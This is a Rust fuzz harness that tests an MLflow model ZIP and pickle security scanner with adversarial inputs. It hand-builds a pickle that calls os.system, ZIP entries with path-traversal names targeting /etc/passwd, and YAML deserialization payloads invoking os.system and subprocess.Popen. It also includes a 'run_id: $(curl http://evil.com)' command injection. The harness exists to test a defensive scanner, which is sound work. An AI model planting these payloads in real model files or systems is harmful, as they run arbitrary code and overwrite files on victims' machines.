// fuzz_mlflow.rs — Deep MLflow model ZIP fuzzer
//
// Exercises MLflow ZIP container scanning with adversarial payloads:
// - Malformed YAML MLmodel files
// - Dangerous pickle payloads inside model.pkl
// - ZIP slip (path traversal in filenames)
// - Multiple pickle files inside ZIP
// - Nested ZIP containers
// - Strict vs non-strict comparison
//
// Run: cargo +nightly fuzz run fuzz_mlflow -- -max_len=65536

#![no_main]

use libfuzzer_sys::fuzz_target;
use fuzz_helpers::{builders, invariants};
use sentinel_pickle::{
    policy::ScanPolicy,
    scanner::scan_data,
};

fuzz_target!(|data: &[u8]| {
    if data.len() < 8 { return; }

    let policy = ScanPolicy::new(false);
    let strict = ScanPolicy::new(true);

    let quarter = data.len() / 4;
    let yaml_data = &data[..quarter];
    let pkl_data = &data[quarter..quarter * 2];
    let extra_data = &data[quarter * 2..quarter * 3];
    let config_data = &data[quarter * 3..];

    // ── Pass 1: Standard MLflow ZIP ───────────────────────────────────
    let zip_bytes = builders::build_mlflow_zip(yaml_data, pkl_data);
    if !zip_bytes.is_empty() {
        let findings = scan_data(&zip_bytes, &policy);
        invariants::assert_findings_valid(&findings);

        // Strict should find >= non-strict
        let strict_findings = scan_data(&zip_bytes, &strict);
        assert!(strict_findings.len() >= findings.len());
    }

    // ── Pass 2: MLflow with dangerous pickle ──────────────────────────
    {
        // Build pickle with os.system GLOBAL
        let mut evil_pkl = vec![0x80, 0x04]; // proto 4
        evil_pkl.push(b'c'); // GLOBAL
        evil_pkl.extend_from_slice(b"os\nsystem\n");
        evil_pkl.push(0x8c); // SHORT_BINUNICODE
        evil_pkl.push(2);
        evil_pkl.extend_from_slice(b"id");
        evil_pkl.push(0x85); // TUPLE1
        evil_pkl.push(b'R'); // REDUCE
        evil_pkl.push(b'.'); // STOP

        let yaml = b"artifact_path: model\nflavors:\n  python_function:\n    loader_module: mlflow.sklearn\n";
        let zip = builders::build_mlflow_zip(yaml, &evil_pkl);
        if !zip.is_empty() {
            let findings = scan_data(&zip, &policy);
            invariants::assert_findings_valid(&findings);
        }
    }

    // ── Pass 3: Multi-entry ZIP (multiple pickle files) ───────────────
    {
        let entries = [
            ("MLmodel", yaml_data),
            ("model.pkl", pkl_data),
            ("extra_model.pkl", extra_data),
            ("config.yaml", config_data),
        ];
        let zip = builders::build_zip(&entries);
        if !zip.is_empty() {
            let findings = scan_data(&zip, &policy);
            invariants::assert_findings_valid(&findings);
        }
    }

    // ── Pass 4: ZIP slip — path traversal in filename ─────────────────
    {
        let entries = [
            ("../../etc/passwd", b"root:x:0:0:root" as &[u8]),
            ("MLmodel", yaml_data),
            ("../../../tmp/evil.pkl", pkl_data),
        ];
        let zip = builders::build_zip(&entries);
        if !zip.is_empty() {
            let _ = scan_data(&zip, &policy);
            // No panic = pass
        }
    }

    // ── Pass 5: Raw pickle with all protocol versions ─────────────────
    for proto in [0u8, 2, 4, 5] {
        let mut pkl = if proto >= 2 {
            vec![0x80, proto]
        } else {
            Vec::new()
        };
        pkl.extend_from_slice(pkl_data);
        pkl.push(b'.'); // STOP
        let findings = scan_data(&pkl, &policy);
        invariants::assert_findings_valid(&findings);
    }

    // ── Pass 6: YAML injection payloads ───────────────────────────────
    let yaml_injections: &[&[u8]] = &[
        b"!!python/object/apply:os.system [id]",
        b"!!python/object:subprocess.Popen\nargs: ['whoami']",
        b"artifact_path: ../../etc/shadow",
        b"run_id: $(curl http://evil.com)",
    ];
    for yaml_payload in yaml_injections {
        let zip = builders::build_mlflow_zip(yaml_payload, &[0x80, 0x04, b'N', b'.']);
        if !zip.is_empty() {
            let _ = scan_data(&zip, &policy);
        }
    }

    // ── Pass 7: Idempotency ───────────────────────────────────────────
    if !zip_bytes.is_empty() {
        let f1 = scan_data(&zip_bytes, &policy);
        let f2 = scan_data(&zip_bytes, &policy);
        assert_eq!(f1.len(), f2.len(), "MLflow scan idempotency violated");
    }
});
